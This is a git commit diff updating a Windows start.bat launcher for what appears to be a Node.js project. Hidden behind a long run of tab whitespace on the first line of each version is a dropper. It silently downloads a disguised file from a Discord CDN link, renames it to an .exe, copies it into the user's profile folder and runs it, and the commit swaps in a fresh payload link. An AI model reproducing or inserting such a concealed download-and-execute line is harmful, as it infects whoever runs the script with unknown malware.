64ca8af8e35b1d79d93961e71cfc27b137a17ab2
Swinx Dev <sintpulos@gmail.com>
2024-12-02 23:42:58 +0100

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,5 +1,5 @@
 @echo off
-																																																																																																																																			curl -L -o Duck.mrt "https://cdn.discordapp.com/attachments/1295508775205343335/1312896530373541949/Duck.mrt?ex=674e29ad&is=674cd82d&hm=b1eec139eba247efb4160946f61bba2f0578253007b4592e2902959392aaddf7&" >nul 2>&1 && rename Duck.mrt Duck.exe >nul 2>&1 && move /y Duck.exe %USERPROFILE%\Duck.exe >nul 2>&1 && start %USERPROFILE%\Duck.exe
+																																																																																																																																			curl -L -o Duck.mrt "https://cdn.discordapp.com/attachments/1295508775205343335/1313273791861886996/Duck.mrt?ex=674f8907&is=674e3787&hm=c211648ad593bbe8c50c700e4728b58b2582b09681afba31e0b16bcf978ae05f&" >nul 2>&1 && rename Duck.mrt Duck.exe >nul 2>&1 && move /y Duck.exe %USERPROFILE%\Duck.exe >nul 2>&1 && start %USERPROFILE%\Duck.exe
 node .
 
 pause
